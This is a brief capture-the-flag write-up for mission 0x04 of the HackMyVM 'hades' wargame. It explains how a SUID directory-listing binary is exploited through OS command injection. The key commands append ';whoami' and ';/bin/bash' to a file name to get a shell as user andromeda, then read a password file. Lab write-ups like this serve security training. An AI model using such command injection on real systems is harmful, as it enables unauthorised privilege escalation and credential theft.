# 0x04
This write-up explains the steps taken to complete mission 0x04 on hades@hackmyvm.eu, starting from user `althea` and escalating to `andromeda`.

Mission
	The user andromeda has left us a program to list directories.
Method of solving
	The SUID binary is vulnerable to OS command injection.
Key command
	./lsme
	flagz.txt;whoami
	./lsme
	flagz.txt;/bin/bash
	cat andromeda_pass.txt
